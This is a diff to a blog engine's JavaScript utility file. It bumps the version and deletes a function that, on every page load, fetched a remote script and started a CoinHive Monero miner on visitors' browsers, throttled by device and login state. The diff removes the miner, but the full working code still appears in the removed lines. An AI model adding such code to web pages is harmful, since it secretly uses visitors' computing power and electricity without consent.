@@ -18,7 +18,7 @@
  *
  * @author <a href="http://vanessa.b3log.org">Liyuan Li</a>
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
- * @version 1.3.1.0, Dec 5, 2017
+ * @version 1.3.1.1, Jan 29, 2018
  */
 
 /**
@@ -238,29 +238,6 @@ var Util = {
     window.scrollTo(0, wHeight - $(window).height() - bottom);
   },
   /**
-   * @description xmr 挖矿，收入将用于维持社区运维
-   */
-  minerStart: function () {
-    if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
-      return
-    }
-    $.ajax({
-      method: "GET",
-      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-      dataType: "script"
-    }).done(function () {
-      var data = {threads: 2, throttle: 0.5}
-      if (latkeConfig && latkeConfig.isLoggedIn === 'true') {
-        data = {threads: 1, throttle: 0.8}
-      }
-      const ua =  navigator.userAgent;
-      if (/Android/i.test(ua) || /BlackBerry/i.test(ua) || /IEMobile/i.test(ua) || /iPhone|iPad|iPod/i.test(ua)) {
-        data = {threads: 1, throttle: 0.8}
-      }
-      (new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', data)).start();
-    });
-  },
-  /**
    * @description 页面初始化执行的函数
    */
   init: function () {
@@ -268,7 +245,6 @@ var Util = {
     Util.killIE();
     Util.setTopBar();
     Util.parseMarkdown();
-    Util.minerStart();
   },
   /**
    * @description 替换侧边栏表情为图片
